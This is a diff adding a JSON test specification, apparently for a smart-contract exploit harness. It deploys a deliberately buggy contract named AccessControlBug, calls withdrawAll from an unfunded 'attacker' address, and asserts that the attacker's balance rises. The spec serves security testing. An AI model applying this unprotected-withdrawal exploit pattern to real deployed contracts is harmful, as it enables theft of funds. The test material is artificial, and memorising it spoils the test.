@@ -1,0 +1,36 @@
+{
+    "attempt_id": "exp_access_V2",
+    "setup": {
+        "deployments": {
+            "target": {
+                "file": "AccessControlBug.sol",
+                "contract": "AccessControlBug",
+                "args": []
+            }
+        }
+    },
+    "prestate": {
+        "deals": [
+            {
+                "address": "attacker",
+                "amount_wei": "0 ether"
+            }
+        ],
+        "storage_writes": []
+    },
+    "calls": [
+        {
+            "contract": "target",
+            "function": "withdrawAll",
+            "args": [],
+            "from": "attacker",
+            "value": "0 ether"
+        }
+    ],
+    "assertions": [
+        {
+            "type": "balance_gt_before",
+            "address": "attacker"
+        }
+    ]
+}
